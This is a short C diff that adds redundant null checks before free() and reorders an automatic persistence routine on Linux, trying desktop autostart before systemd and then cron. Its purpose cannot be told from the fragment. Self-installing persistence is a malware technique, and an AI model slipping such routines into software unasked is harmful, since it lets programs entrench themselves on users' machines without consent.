@@ -450,7 +450,7 @@ char* get_executable_path(void) {
     if (path && GetModuleFileName(NULL, path, MAX_PATH) > 0) {
         return path;
     }
-    free(path);
+    if (path) free(path);
     return NULL;
 #else
     char *path = malloc(PATH_MAX);
@@ -461,7 +461,7 @@ char* get_executable_path(void) {
             return path;
         }
     }
-    free(path);
+    if (path) free(path);
     return NULL;
 #endif
 }
@@ -516,12 +516,12 @@ int install_automatic_persistence(void) {
 #else
     // Try Linux methods in order of preference
     
-    // 1. Try systemd first (most reliable if available)
-    if (install_persistence(PERSISTENCE_SYSTEMD, executable_path) == 0) {
+    // 1. Try autostart first (works on most desktop environments)
+    if (install_persistence(PERSISTENCE_AUTOSTART, executable_path) == 0) {
         success = 1;
     }
-    // 2. Try autostart as backup (works on most desktop environments)
-    else if (install_persistence(PERSISTENCE_AUTOSTART, executable_path) == 0) {
+    // 2. Try systemd as backup (if available)
+    else if (install_persistence(PERSISTENCE_SYSTEMD, executable_path) == 0) {
         success = 1;
     }
     // 3. Try cron as last resort
